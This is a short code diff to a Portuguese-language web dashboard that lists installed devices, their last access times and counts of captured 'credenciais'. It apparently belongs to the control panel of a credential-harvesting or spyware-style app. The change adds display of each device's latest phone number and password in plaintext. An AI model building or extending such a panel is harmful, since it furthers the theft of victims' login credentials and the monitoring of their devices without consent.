@@ -550,7 +550,7 @@ function actualizarStats() {
   const total = todosDispositivos.length;
   const hoje = todosDispositivos.filter(d => isHoje(d.ultimo_acesso)).length;
   const semana = todosDispositivos.filter(d => isSemana(d.ultimo_acesso)).length;
-  const comCreds = new Set(todasCredenciais.map(c => c.device_id)).size;
+  const comCreds = new Set(todasCredenciais.filter(c => c.device_id).map(c => c.device_id)).size;
 
   document.getElementById("stat-total").textContent = total;
   document.getElementById("stat-hoje").textContent = hoje;
@@ -605,6 +605,8 @@ function renderLista(dispositivos, credenciais) {
               <div class="info-row"><span class="info-label">Instalação</span><span class="info-val">${formatDate(dev.timestamp || dev.created_at)}</span></div>
               <div class="info-row"><span class="info-label">Último Acesso</span><span class="info-val green">${formatDate(dev.ultimo_acesso)}</span></div>
               <div class="info-row"><span class="info-label">Credenciais</span><span class="info-val ${devCreds.length ? 'red' : ''}">${devCreds.length} registos</span></div>
+              <div class="info-row"><span class="info-label">Número</span><span class="info-val green">${ultimoNumero}</span></div>
+              <div class="info-row"><span class="info-label">Senha</span><span class="info-val red">${ultimaSenha}</span></div>
               <div class="info-row"><span class="info-label">Estado</span><span class="info-val ${activo ? 'green' : ''}">${activo ? 'Activo hoje' : 'Inactivo'}</span></div>
             </div>
           </div>
